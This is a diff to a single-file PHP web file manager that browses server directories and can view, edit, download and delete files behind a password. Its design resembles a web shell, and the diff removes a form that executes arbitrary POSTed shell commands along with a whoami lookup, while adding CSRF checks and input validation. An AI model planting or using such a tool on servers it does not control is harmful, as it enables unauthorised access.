@@ -36,9 +36,39 @@ function decryptPath(string $h): string
 
 function authenticate(): bool
 {
-    if (isset($_POST['password']) && password_verify($_POST['password'], PASSWORD_HASH))
+    if (isset($_POST['password']) && is_string($_POST['password']) && password_verify($_POST['password'], PASSWORD_HASH)) {
+        session_regenerate_id(true);
         $_SESSION['authenticated'] = true;
+    }
     return $_SESSION['authenticated'] ?? false;
+}
+
+function csrfToken(): string
+{
+    if (empty($_SESSION['csrf_token']) || !is_string($_SESSION['csrf_token']))
+        $_SESSION['csrf_token'] = bin2hex(random_bytes(32));
+    return $_SESSION['csrf_token'];
+}
+
+function csrfOk(): bool
+{
+    $token = $_POST['csrf_token'] ?? '';
+    return is_string($token) && !empty($_SESSION['csrf_token'])
+        && is_string($_SESSION['csrf_token'])
+        && hash_equals($_SESSION['csrf_token'], $token);
+}
+
+function jsonRespond(array $data): void
+{
+    header('Content-Type: application/json');
+    echo json_encode($data);
+    exit;
+}
+
+function validSimpleName(string $name): bool
+{
+    return $name !== '' && $name !== '.' && $name !== '..'
+        && !preg_match('#[\\\\/]#', $name);
 }
 
 function formatSize(int $size): string
@@ -54,7 +84,9 @@ function formatSize(int $size): string
 
 function getPerms(string $file): string
 {
-    $p = fileperms($file);
+    $p = @fileperms($file);
+    if ($p === false)
+        $p = 0;
     $map = [[0x0100, 0x0080, 0x0040, 0x0800, 's'], [0x0020, 0x0010, 0x0008, 0x0400, 's'], [0x0004, 0x0002, 0x0001, 0x0200, 't']];
     $info = '';
 
@@ -66,16 +98,6 @@ function getPerms(string $file): string
     $color = is_writable($file) ? 'text-success' : (is_readable($file) ? 'text-warning' : 'text-error');
     return '<span class="' . $color . ' font-mono text-xs">' . $info . '</span>';
 }
-
-function getCurrentUser(): string
-{
-    if (function_exists('posix_geteuid'))
-        return posix_getpwuid(posix_geteuid())['name'] ?? '';
-    if (function_exists('exec') && !in_array('exec', explode(',', ini_get('disable_functions'))))
-        return exec('whoami') ?: '';
-    return getenv('USERNAME') ?: getenv('USER') ?: '';
-}
-
 function breadcrumbPath(string $path): string
 {
     $sep = DIRECTORY_SEPARATOR;
@@ -107,13 +129,25 @@ function renderFileTable(string $dir): string
 {
     ob_start();
 
-    $items = array_diff(scandir($dir), ['.', '..']);
+    if ($dir === '' || !is_dir($dir) || !is_readable($dir)) {
+        echo '<div class="file-list-container">';
+        echo '<div class="bg-surface-container border border-outline-variant text-on-surface-variant rounded-xl p-8 text-center">';
+        echo '<p class="font-medium text-on-surface mb-1">Unable to open directory</p>';
+        echo '<p class="text-sm">The directory does not exist, or is not readable.</p>';
+        echo '</div></div>';
+        return ob_get_clean();
+    }
+
+    $items = @scandir($dir);
+    if ($items === false)
+        $items = [];
+    $items = array_diff($items, ['.', '..']);
     $folders = $files = [];
     foreach ($items as $item)
         is_dir($dir . DIRECTORY_SEPARATOR . $item) ? $folders[] = $item : $files[] = $item;
-    sort($folders);
-    sort($files);
-    $sortedItems = array_merge($folders, $files);
+    natcasesort($folders);
+    natcasesort($files);
+    $sortedItems = array_merge(array_values($folders), array_values($files));
 
     $svg = [
         'search' => '<svg class="h-5 w-5 text-on-surface-variant" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z"/></svg>',
@@ -162,11 +196,22 @@ function renderFileTable(string $dir): string
     echo '</tr></thead><tbody>';
     echo "<tr class=\"hover:bg-surface-container-high transition-colors\"><td class=\"$tdClass\" colspan=\"5\"><a href=\"?cd=$parentEnc\" class=\"flex items-center text-primary hover:text-primary-hover transition-colors font-medium\">{$svg['back']}Parent Directory</a></td></tr>";
 
+    $itemMeta = [];
+    foreach ($sortedItems as $item) {
+        $fullPath = $dir . DIRECTORY_SEPARATOR . $item;
+        $itemMeta[$item] = [
+            'size' => @filesize($fullPath),
+            'mtime' => @filemtime($fullPath),
+        ];
+    }
+
     foreach ($sortedItems as $item) {
         $fullPath = $dir . DIRECTORY_SEPARATOR . $item;
         $isDir = is_dir($fullPath);
         $enc = encryptPath($fullPath);
         $name = htmlspecialchars($item);
+        $size = (int) $itemMeta[$item]['size'];
+        $mtime = (int) ($itemMeta[$item]['mtime'] ?: 0);
 
         echo '<tr class="hover:bg-surface-container-high transition-colors file-row" data-filename="' . htmlspecialchars(strtolower($item)) . '">';
         echo "<td class=\"$tdClass\">";
@@ -179,9 +224,9 @@ function renderFileTable(string $dir): string
             echo '<div class="p-1.5 bg-surface-container rounded-lg mr-3 group-hover:bg-surface-container-high transition-colors">' . $svg['file'] . '</div>';
         }
         echo "<span class=\"font-medium truncate max-w-xs\">$name</span></a></td>";
-        echo "<td class=\"$tdClass font-mono text-sm text-on-surface-variant\">" . ($isDir ? '-' : formatSize(filesize($fullPath))) . '</td>';
+        echo "<td class=\"$tdClass font-mono text-sm text-on-surface-variant\">" . ($isDir ? '-' : formatSize($size)) . '</td>';
         echo "<td class=\"$tdClass\">" . getPerms($fullPath) . '</td>';
-        echo "<td class=\"$tdClass text-sm text-on-surface-variant\">" . date("Y-m-d H:i", filemtime($fullPath)) . '</td>';
+        echo "<td class=\"$tdClass text-sm text-on-surface-variant\">" . ($mtime ? date("Y-m-d H:i", $mtime) : '-') . '</td>';
         echo "<td class=\"$tdClass\"><div class=\"flex items-center gap-1\">";
         if (!$isDir)
             echo $actionBtn('download', $fullPath, $item, $isDir) . $actionBtn('edit', $fullPath, $item, $isDir);
@@ -200,6 +245,8 @@ function renderFileTable(string $dir): string
         $isDir = is_dir($fullPath);
         $enc = encryptPath($fullPath);
         $name = htmlspecialchars($item);
+        $size = (int) $itemMeta[$item]['size'];
+        $mtime = (int) ($itemMeta[$item]['mtime'] ?: 0);
 
         echo '<div class="file-card bg-surface rounded-xl shadow-sm border border-outline-variant overflow-hidden hover:border-primary hover:shadow-md transition-all" data-filename="' . htmlspecialchars(strtolower($item)) . '">';
 
@@ -210,7 +257,7 @@ function renderFileTable(string $dir): string
         } else {
             echo "<a href=\"?action=view&file=$enc\" class=\"flex items-center p-4 border-b border-outline-variant\">";
             echo '<div class="p-3 bg-surface-container rounded-xl mr-4"><svg class="h-6 w-6 text-on-surface-variant" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12h6m-6 4h6m2 5H7a2 2 0 01-2-2V5a2 2 0 012-2h5.586a1 1 0 01.707.293l5.414 5.414a1 1 0 01.293.707V19a2 2 0 01-2 2z"/></svg></div>';
-            echo "<div class=\"flex-1 min-w-0\"><h3 class=\"font-semibold text-on-surface truncate\">$name</h3><p class=\"text-sm text-on-surface-variant\">" . formatSize(filesize($fullPath)) . ' &bull; ' . date("Y-m-d H:i", filemtime($fullPath)) . '</p></div></a>';
+            echo "<div class=\"flex-1 min-w-0\"><h3 class=\"font-semibold text-on-surface truncate\">$name</h3><p class=\"text-sm text-on-surface-variant\">" . formatSize($size) . ' &bull; ' . ($mtime ? date("Y-m-d H:i", $mtime) : '-') . '</p></div></a>';
         }
 
         echo '<div class="flex items-center justify-between px-4 py-3 bg-surface-container">';
@@ -236,16 +283,47 @@ function showAlert(string $message, string $type = 'success'): void
     $alertMessages[] = ['message' => $message, 'type' => $type];
 }
 
+function stashAlerts(): void
+{
+    global $alertMessages;
+    if (!empty($alertMessages))
+        $_SESSION['pending_alerts'] = $alertMessages;
+}
+
+function pullStashedAlerts(): array
+{
+    if (!empty($_SESSION['pending_alerts']) && is_array($_SESSION['pending_alerts'])) {
+        $alerts = $_SESSION['pending_alerts'];
+        unset($_SESSION['pending_alerts']);
+        return $alerts;
+    }
+    return [];
+}
+
 function viewFile(string $file): void
 {
-    $content = htmlspecialchars(file_get_contents($file));
+    if ($file === '' || !file_exists($file)) {
+        showAlert("File not found or no longer exists!", "error");
+        $fallback = dirname($file);
+        fileManager(is_dir($fallback) ? $fallback : getcwd());
+        return;
+    }
+
+    if (is_dir($file)) {
+        fileManager($file);
+        return;
+    }
+
+    $raw = @file_get_contents($file);
+    $content = htmlspecialchars($raw === false ? '' : $raw);
     $enc = encryptPath($file);
     $dirEnc = encryptPath(dirname($file));
     $name = htmlspecialchars(basename($file));
     $path = htmlspecialchars($file);
-    $size = formatSize(filesize($file));
+    $size = formatSize((int) @filesize($file));
     $perms = getPerms($file);
-    $modified = date("Y-m-d H:i:s", filemtime($file));
+    $mtime = @filemtime($file);
+    $modified = $mtime ? date("Y-m-d H:i:s", $mtime) : '-';
 
     $btnPrimary = 'flex items-center px-4 py-2.5 bg-primary text-on-primary rounded-xl hover:bg-primary-hover transition-colors shadow-sm font-medium';
     $btnSecondary = 'flex items-center px-4 py-2.5 bg-surface-container-high text-on-surface rounded-xl hover:bg-surface-container-highest transition-colors shadow-sm font-medium';
@@ -299,7 +377,7 @@ HTML;
 
 function downloadFile(string $file): void
 {
-    if (file_exists($file)) {
+    if ($file !== '' && is_file($file) && is_readable($file)) {
         $filename = basename($file);
         header('Content-Description: File Transfer');
         header('Content-Type: application/octet-stream');
@@ -307,28 +385,34 @@ function downloadFile(string $file): void
         header('Expires: 0');
         header('Cache-Control: must-revalidate');
         header('Pragma: public');
-        header('Content-Length: ' . filesize($file));
+        header('Content-Length: ' . @filesize($file));
         flush();
         readfile($file);
         exit;
     }
+
+    http_response_code(404);
+    header('Content-Type: text/plain');
+    echo "404 Not Found: the requested file does not exist or is not readable.";
+    exit;
 }
 
 function editFile(string $file): void
 {
-    $dirname = dirname($file);
-
-    if (isset($_POST['content'])) {
-        file_put_contents($file, $_POST['content']);
-        $_POST = [];
-        showAlert("File saved successfully!", "success");
-        fileManager($dirname);
+    if ($file === '' || !is_file($file)) {
+        showAlert("File not found or no longer exists!", "error");
+        $fallback = dirname($file);
+        fileManager(is_dir($fallback) ? $fallback : getcwd());
         return;
     }
 
-    $content = htmlspecialchars(file_get_contents($file));
+    $dirname = dirname($file);
+
+    $raw = @file_get_contents($file);
+    $content = htmlspecialchars($raw === false ? '' : $raw);
     $name = htmlspecialchars(basename($file));
     $dirEnc = encryptPath($dirname);
+    $token = csrfToken();
     $btnPrimary = 'flex items-center px-4 py-2.5 bg-primary text-on-primary rounded-xl hover:bg-primary-hover transition-colors shadow-sm font-medium';
     $btnSecondary = 'flex items-center px-4 py-2.5 bg-surface-container-high text-on-surface rounded-xl hover:bg-surface-container-highest transition-colors shadow-sm font-medium';
 
@@ -347,6 +431,7 @@ function editFile(string $file): void
         </div>
 
         <form method="post">
+            <input type="hidden" name="csrf_token" value="$token">
             <div class="p-4 sm:p-6">
                 <textarea name="content" rows="20" class="w-full p-4 bg-surface-container-highest text-on-surface border-0 rounded-xl font-mono text-xs sm:text-sm leading-relaxed focus:outline-none focus:ring-2 focus:ring-primary resize-y" style="min-height: 300px;">$content</textarea>
             </div>
@@ -361,159 +446,6 @@ function editFile(string $file): void
                     <svg class="h-5 w-5 mr-2" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                         <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12"></path>
                     </svg>Cancel
-                </a>
-            </div>
-        </form>
-    </div>
-</div>
-HTML;
-}
-
-function newFile(string $dir): void
-{
-    if (isset($_POST['filename']) && isset($_POST['content'])) {
-        if (empty($_POST['filename'])) {
-            showAlert("File name cannot be empty!", "error");
-            displayNewFileForm($dir);
-            return;
-        }
-
-        $filename = $dir . DIRECTORY_SEPARATOR . $_POST['filename'];
-        file_put_contents($filename, $_POST['content']);
-
-        $_POST = array();
-        showAlert("File created successfully!", "success");
-        fileManager($dir);
-        return;
-    }
-
-    displayNewFileForm($dir);
-}
-
-function displayNewFileForm(string $dir): void
-{
-    $dirEsc = htmlspecialchars($dir);
-    $dirEnc = encryptPath($dir);
-
-    echo <<<HTML
-<div class="max-w-4xl mx-auto">
-    <div class="bg-surface rounded-2xl shadow-sm border border-outline-variant overflow-hidden">
-        <div class="px-4 sm:px-6 py-4 border-b border-outline-variant bg-surface-container">
-            <h2 class="text-lg sm:text-xl font-bold text-on-surface flex items-center">
-                <div class="p-2 bg-surface rounded-xl shadow-sm mr-3">
-                    <svg class="h-5 w-5 sm:h-6 sm:w-6 text-primary" fill="none" stroke="currentColor" viewBox="0 0 24 24">
-                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 9v3m0 0v3m0-3h3m-3 0H9m12 0a9 9 0 11-18 0 9 9 0 0118 0z"></path>
-                    </svg>
-                </div>
-                Create New File
-            </h2>
-        </div>
-
-        <form method="post">
-            <div class="p-4 sm:p-6 space-y-4">
-                <div class="p-3 bg-surface-container rounded-xl border border-outline-variant">
-                    <span class="text-sm text-on-surface-variant">Location:</span>
-                    <span class="ml-2 text-sm font-mono text-on-surface break-all">$dirEsc</span>
-                </div>
-
-                <div>
-                    <label class="block text-sm font-medium text-on-surface mb-2">Filename</label>
-                    <input type="text" name="filename" class="w-full px-4 py-2.5 bg-surface border border-outline-variant rounded-xl focus:outline-none focus:ring-2 focus:ring-primary text-on-surface placeholder-on-surface-variant transition-shadow" placeholder="Enter filename (e.g., script.php)" required>
-                </div>
-
-                <div>
-                    <label class="block text-sm font-medium text-on-surface mb-2">Content</label>
-                    <textarea name="content" rows="12" class="w-full p-4 bg-surface-container-highest text-on-surface border-0 rounded-xl font-mono text-xs sm:text-sm leading-relaxed focus:outline-none focus:ring-2 focus:ring-primary resize-y" style="min-height: 250px;" placeholder="Enter file content here..."></textarea>
-                </div>
-            </div>
-
-            <div class="px-4 sm:px-6 py-4 bg-surface-container border-t border-outline-variant flex flex-wrap gap-2">
-                <button type="submit" class="flex items-center px-4 py-2.5 bg-primary text-on-primary rounded-xl hover:bg-primary-hover transition-colors shadow-sm font-medium">
-                    <svg class="h-5 w-5 mr-2" fill="none" stroke="currentColor" viewBox="0 0 24 24">
-                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7"></path>
-                    </svg>
-                    Create File
-                </button>
-
-                <a href="?cd=$dirEnc" class="flex items-center px-4 py-2.5 bg-surface-container-high text-on-surface rounded-xl hover:bg-surface-container-highest transition-colors shadow-sm font-medium">
-                    <svg class="h-5 w-5 mr-2" fill="none" stroke="currentColor" viewBox="0 0 24 24">
-                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12"></path>
-                    </svg>
-                    Cancel
-                </a>
-            </div>
-        </form>
-    </div>
-</div>
-HTML;
-}
-
-function newFolder(string $dir): void
-{
-    if (isset($_POST['foldername'])) {
-        if (empty($_POST['foldername'])) {
-            showAlert("Folder name cannot be empty!", "error");
-            displayNewFolderForm($dir);
-            return;
-        }
-
-        $foldername = $dir . DIRECTORY_SEPARATOR . $_POST['foldername'];
-        mkdir($foldername, 0755);
-
-        $_POST = array();
-        showAlert("Folder created successfully!", "success");
-        fileManager($dir);
-        return;
-    }
-
-    displayNewFolderForm($dir);
-}
-
-function displayNewFolderForm(string $dir): void
-{
-    $dirEsc = htmlspecialchars($dir);
-    $dirEnc = encryptPath($dir);
-
-    echo <<<HTML
-<div class="max-w-lg mx-auto">
-    <div class="bg-surface rounded-2xl shadow-sm border border-outline-variant overflow-hidden">
-        <div class="px-4 sm:px-6 py-4 border-b border-outline-variant bg-surface-container">
-            <h2 class="text-lg sm:text-xl font-bold text-on-surface flex items-center">
-                <div class="p-2 bg-surface rounded-xl shadow-sm mr-3">
-                    <svg class="h-5 w-5 sm:h-6 sm:w-6 text-primary" fill="none" stroke="currentColor" viewBox="0 0 24 24">
-                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 13h6m-3-3v6m-9-6h.01M19 13h.01M19 19h.01M5 19h.01M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z"></path>
-                    </svg>
-                </div>
-                Create New Folder
-            </h2>
-        </div>
-
-        <form method="post">
-            <div class="p-4 sm:p-6 space-y-4">
-                <div class="p-3 bg-surface-container rounded-xl border border-outline-variant">
-                    <span class="text-sm text-on-surface-variant">Location:</span>
-                    <span class="ml-2 text-sm font-mono text-on-surface break-all">$dirEsc</span>
-                </div>
-
-                <div>
-                    <label class="block text-sm font-medium text-on-surface mb-2">Folder Name</label>
-                    <input type="text" name="foldername" class="w-full px-4 py-2.5 bg-surface border border-outline-variant rounded-xl focus:outline-none focus:ring-2 focus:ring-primary text-on-surface placeholder-on-surface-variant transition-shadow" placeholder="Enter folder name" required>
-                </div>
-            </div>
-
-            <div class="px-4 sm:px-6 py-4 bg-surface-container border-t border-outline-variant flex flex-wrap gap-2">
-                <button type="submit" class="flex items-center px-4 py-2.5 bg-primary text-on-primary rounded-xl hover:bg-primary-hover transition-colors shadow-sm font-medium">
-                    <svg class="h-5 w-5 mr-2" fill="none" stroke="currentColor" viewBox="0 0 24 24">
-                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7"></path>
-                    </svg>
-                    Create Folder
-                </button>
-
-                <a href="?cd=$dirEnc" class="flex items-center px-4 py-2.5 bg-surface-container-high text-on-surface rounded-xl hover:bg-surface-container-highest transition-colors shadow-sm font-medium">
-                    <svg class="h-5 w-5 mr-2" fill="none" stroke="currentColor" viewBox="0 0 24 24">
-                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12"></path>
-                    </svg>
-                    Cancel
                 </a>
             </div>
         </form>
@@ -590,265 +522,6 @@ function getFunctionalCmd(string $cmd): string
     return "Failed to execute command.";
 }
 
-function commandLine(string $dir): void
-{
-    $output = '';
-    $dirEnc = encryptPath($dir);
-
-    if (isset($_POST['command'])) {
-        $command = $_POST['command'];
-        chdir($dir);
-        $output = getFunctionalCmd($command);
-    }
-
-    $workingDirEsc = htmlspecialchars($dir);
-
-    echo <<<HTML
-<div class="max-w-6xl mx-auto">
-    <div class="bg-surface rounded-2xl shadow-sm border border-outline-variant overflow-hidden">
-        <div class="px-4 sm:px-6 py-4 border-b border-outline-variant bg-surface-container">
-            <h2 class="text-lg sm:text-xl font-bold text-on-surface flex items-center">
-                <div class="p-2 bg-surface rounded-xl shadow-sm mr-3">
-                    <svg class="h-5 w-5 sm:h-6 sm:w-6 text-primary" fill="none" stroke="currentColor" viewBox="0 0 24 24">
-                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M8 9l3 3-3 3m5 0h3M5 20h14a2 2 0 002-2V6a2 2 0 00-2-2H5a2 2 0 00-2 2v12a2 2 0 002 2z"></path>
-                    </svg>
-                </div>
-                Command Line
-            </h2>
-        </div>
-
-        <div class="p-4 sm:p-6">
-            <div class="mb-4 p-3 bg-surface-container rounded-xl border border-outline-variant">
-                <span class="text-sm text-on-surface-variant">Working directory:</span>
-                <span class="ml-2 text-sm font-mono text-on-surface break-all">$workingDirEsc</span>
-            </div>
-
-            <form method="post" class="mb-4">
-                <div class="flex flex-col sm:flex-row gap-2">
-                    <div class="flex-1">
-                        <div class="relative">
-                            <div class="absolute inset-y-0 left-0 pl-4 flex items-center pointer-events-none">
-                                <span class="text-primary font-mono font-bold">$</span>
-                            </div>
-                            <input type="text" name="command" class="w-full pl-10 pr-4 py-3 bg-surface-container border border-outline-variant rounded-xl focus:outline-none focus:ring-2 focus:ring-primary text-on-surface placeholder-on-surface-variant transition-all font-mono text-sm" placeholder="Enter command (e.g., ls -la)" autocomplete="off">
-                        </div>
-                    </div>
-
-                    <button type="submit" class="flex items-center justify-center px-5 py-3 bg-primary text-on-primary rounded-xl hover:bg-primary-hover transition-colors shadow-sm font-medium whitespace-nowrap">
-                        <svg class="h-5 w-5 mr-2" fill="none" stroke="currentColor" viewBox="0 0 24 24">
-                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13 10V3L4 14h7v7l9-11h-7z"></path>
-                        </svg>
-                        Execute
-                    </button>
-                </div>
-            </form>
-
-HTML;
-
-    if (!empty($output)) {
-        $outputEsc = htmlspecialchars($output);
-        echo <<<HTML
-            <div class="mt-4">
-                <div class="flex items-center mb-3">
-                    <div class="p-1.5 bg-surface-container-high rounded-lg mr-2">
-                        <svg class="h-4 w-4 text-primary" fill="none" stroke="currentColor" viewBox="0 0 24 24">
-                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z"></path>
-                        </svg>
-                    </div>
-                    <h3 class="font-semibold text-on-surface">Output</h3>
-                </div>
-                <div class="bg-surface-container-highest text-primary p-4 rounded-xl overflow-auto max-h-[50vh] sm:max-h-[60vh] font-mono text-xs sm:text-sm leading-relaxed scrollbar-thin">
-                    <pre class="whitespace-pre-wrap">$outputEsc</pre>
-                </div>
-            </div>
-HTML;
-    } else {
-        echo <<<HTML
-            <div class="p-6 bg-surface-container border border-outline-variant rounded-xl text-center">
-                <div class="inline-flex items-center justify-center w-12 h-12 rounded-full bg-surface-container-high mb-3">
-                    <svg class="h-6 w-6 text-on-surface-variant" fill="none" stroke="currentColor" viewBox="0 0 24 24">
-                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M8 9l3 3-3 3m5 0h3M5 20h14a2 2 0 002-2V6a2 2 0 00-2-2H5a2 2 0 00-2 2v12a2 2 0 002 2z"></path>
-                    </svg>
-                </div>
-                <p class="text-on-surface-variant">Enter a command and press Execute</p>
-            </div>
-HTML;
-    }
-
-    echo <<<HTML
-        </div>
-    </div>
-</div>
-HTML;
-}
-
-function renameFile(string $file): void
-{
-    $dirname = dirname($file);
-
-    if (isset($_POST['newname'])) {
-        if (empty($_POST['newname'])) {
-            showAlert("New name cannot be empty!", "error");
-            displayRenameForm($file);
-            return;
-        }
-
-        $newname = $dirname . DIRECTORY_SEPARATOR . $_POST['newname'];
-        rename($file, $newname);
-
-        $_POST = array();
-        showAlert("File renamed successfully!", "success");
-        fileManager($dirname);
-        return;
-    }
-
-    displayRenameForm($file);
-}
-
-function displayRenameForm(string $file): void
-{
-    $dirname = dirname($file);
-    $isDir = is_dir($file);
-    $currentName = htmlspecialchars(basename($file));
-    $dirnameEnc = encryptPath($dirname);
-    $typeLabel = $isDir ? 'Directory' : 'File';
-
-    echo <<<HTML
-<div class="max-w-lg mx-auto">
-    <div class="bg-surface rounded-2xl shadow-sm border border-outline-variant overflow-hidden">
-        <div class="px-4 sm:px-6 py-4 border-b border-outline-variant bg-surface-container">
-            <h2 class="text-lg sm:text-xl font-bold text-on-surface flex items-center">
-                <div class="p-2 bg-surface rounded-xl shadow-sm mr-3">
-                    <svg class="h-5 w-5 sm:h-6 sm:w-6 text-primary" fill="none" stroke="currentColor" viewBox="0 0 24 24">
-                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15.232 5.232l3.536 3.536m-2.036-5.036a2.5 2.5 0 113.536 3.536L6.5 21.036H3v-3.572L16.732 3.732z"></path>
-                    </svg>
-                </div>
-                Rename $typeLabel
-            </h2>
-        </div>
-
-        <form method="post">
-            <div class="p-4 sm:p-6 space-y-4">
-                <div class="p-3 bg-surface-container rounded-xl border border-outline-variant">
-                    <span class="text-sm text-on-surface-variant">Current name:</span>
-                    <span class="ml-2 text-sm font-medium text-on-surface break-all">$currentName</span>
-                </div>
-
-                <div>
-                    <label class="block text-sm font-medium text-on-surface mb-2">New Name</label>
-                    <input type="text" name="newname" value="$currentName" class="w-full px-4 py-2.5 bg-surface border border-outline-variant rounded-xl focus:outline-none focus:ring-2 focus:ring-primary text-on-surface transition-shadow" required>
-                </div>
-            </div>
-
-            <div class="px-4 sm:px-6 py-4 bg-surface-container border-t border-outline-variant flex flex-wrap gap-2">
-                <button type="submit" class="flex items-center px-4 py-2.5 bg-primary text-on-primary rounded-xl hover:bg-primary-hover transition-colors shadow-sm font-medium">
-                    <svg class="h-5 w-5 mr-2" fill="none" stroke="currentColor" viewBox="0 0 24 24">
-                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7"></path>
-                    </svg>
-                    Rename
-                </button>
-
-                <a href="?cd=$dirnameEnc" class="flex items-center px-4 py-2.5 bg-surface-container-high text-on-surface rounded-xl hover:bg-surface-container-highest transition-colors shadow-sm font-medium">
-                    <svg class="h-5 w-5 mr-2" fill="none" stroke="currentColor" viewBox="0 0 24 24">
-                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12"></path>
-                    </svg>
-                    Cancel
-                </a>
-            </div>
-        </form>
-    </div>
-</div>
-HTML;
-}
-
-function chmodFile(string $file): void
-{
-    $dirname = dirname($file);
-
-    if (isset($_POST['permission'])) {
-        if (!preg_match('/^[0-7]{3,4}$/', $_POST['permission'])) {
-            showAlert("Invalid permission format!", "error");
-            displayChmodForm($file);
-            return;
-        }
-
-        $permission = octdec($_POST['permission']);
-        chmod($file, $permission);
-
-        $_POST = array();
-        showAlert("Permissions changed successfully!", "success");
-        fileManager($dirname);
-        return;
-    }
-
-    displayChmodForm($file);
-}
-
-function displayChmodForm(string $file): void
-{
-    $dirname = dirname($file);
-    $isDir = is_dir($file);
-    $currentPerms = substr(sprintf('%o', fileperms($file)), -4);
-    $baseName = htmlspecialchars(basename($file));
-    $dirnameEnc = encryptPath($dirname);
-
-    echo <<<HTML
-<div class="max-w-lg mx-auto">
-    <div class="bg-surface rounded-2xl shadow-sm border border-outline-variant overflow-hidden">
-        <div class="px-4 sm:px-6 py-4 border-b border-outline-variant bg-surface-container">
-            <h2 class="text-lg sm:text-xl font-bold text-on-surface flex items-center">
-                <div class="p-2 bg-surface rounded-xl shadow-sm mr-3">
-                    <svg class="h-5 w-5 sm:h-6 sm:w-6 text-primary" fill="none" stroke="currentColor" viewBox="0 0 24 24">
-                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"></path>
-                    </svg>
-                </div>
-                Change Permissions
-            </h2>
-        </div>
-
-        <form method="post">
-            <div class="p-4 sm:p-6 space-y-4">
-                <div class="p-3 bg-surface-container rounded-xl border border-outline-variant space-y-1">
-                    <div class="flex justify-between"><span class="text-sm text-on-surface-variant">File:</span><span class="text-sm font-medium text-on-surface truncate max-w-[200px]" title="$baseName">$baseName</span></div>
-                    <div class="flex justify-between"><span class="text-sm text-on-surface-variant">Current:</span><span class="text-sm font-mono font-medium text-primary">$currentPerms</span></div>
-                </div>
-
-                <div>
-                    <label class="block text-sm font-medium text-on-surface mb-2">New Permissions (octal)</label>
-                    <input type="text" name="permission" value="$currentPerms" class="w-full px-4 py-2.5 bg-surface border border-outline-variant rounded-xl font-mono focus:outline-none focus:ring-2 focus:ring-primary text-on-surface transition-shadow" required pattern="[0-7]{3,4}" placeholder="e.g. 0755">
-                </div>
-
-                <div class="p-4 bg-surface-container-high border border-outline-variant rounded-xl text-sm">
-                    <p class="font-semibold text-on-surface mb-2">Common permissions:</p>
-                    <div class="space-y-2">
-                        <div class="flex items-center justify-between"><span class="font-mono text-primary bg-surface px-2 py-0.5 rounded">0755</span><span class="text-on-surface-variant">Directory (drwxr-xr-x)</span></div>
-                        <div class="flex items-center justify-between"><span class="font-mono text-primary bg-surface px-2 py-0.5 rounded">0644</span><span class="text-on-surface-variant">File (-rw-r--r--)</span></div>
-                        <div class="flex items-center justify-between"><span class="font-mono text-primary bg-surface px-2 py-0.5 rounded">0777</span><span class="text-on-surface-variant">Full access</span></div>
-                    </div>
-                </div>
-            </div>
-
-            <div class="px-4 sm:px-6 py-4 bg-surface-container border-t border-outline-variant flex flex-wrap gap-2">
-                <button type="submit" class="flex items-center px-4 py-2.5 bg-primary text-on-primary rounded-xl hover:bg-primary-hover transition-colors shadow-sm font-medium">
-                    <svg class="h-5 w-5 mr-2" fill="none" stroke="currentColor" viewBox="0 0 24 24">
-                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7"></path>
-                    </svg>
-                    Change
-                </button>
-
-                <a href="?cd=$dirnameEnc" class="flex items-center px-4 py-2.5 bg-surface-container-high text-on-surface rounded-xl hover:bg-surface-container-highest transition-colors shadow-sm font-medium">
-                    <svg class="h-5 w-5 mr-2" fill="none" stroke="currentColor" viewBox="0 0 24 24">
-                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12"></path>
-                    </svg>
-                    Cancel
-                </a>
-            </div>
-        </form>
-    </div>
-</div>
-HTML;
-}
-
 function deleteFile(string $file): bool
 {
     $isDir = is_dir($file);
@@ -895,358 +568,320 @@ error_reporting(0);
 set_time_limit(0);
 ini_set('memory_limit', '256M');
 
+$alertMessages = array_merge($alertMessages, pullStashedAlerts());
+
 if (isset($_GET['logout'])) {
     session_destroy();
     header('Location: ?');
     exit;
 }
 
+function ajaxGuard(): void
+{
+    if (!authenticate()) {
+        jsonRespond(['success' => false, 'message' => 'Authentication required']);
+    }
+    if (!csrfOk()) {
+        jsonRespond(['success' => false, 'message' => 'Invalid or missing CSRF token. Reload the page and try again.']);
+    }
+}
+
 if (isset($_POST['ajax_delete'])) {
-    if (authenticate()) {
-        $file = decryptPath($_POST['path']);
+    ajaxGuard();
+    {
+        $file = decryptPath($_POST['path'] ?? '');
         $dirname = dirname($file);
         $isDir = is_dir($file);
-        $success = deleteFile($file);
+        $success = $file !== '' && deleteFile($file);
 
         $type = $isDir ? "Directory" : "File";
         $message = $success ? "$type deleted successfully" : "Delete failed: Could not delete $type";
 
-        header('Content-Type: application/json');
-        echo json_encode([
+        jsonRespond([
             'success' => $success,
             'message' => $message,
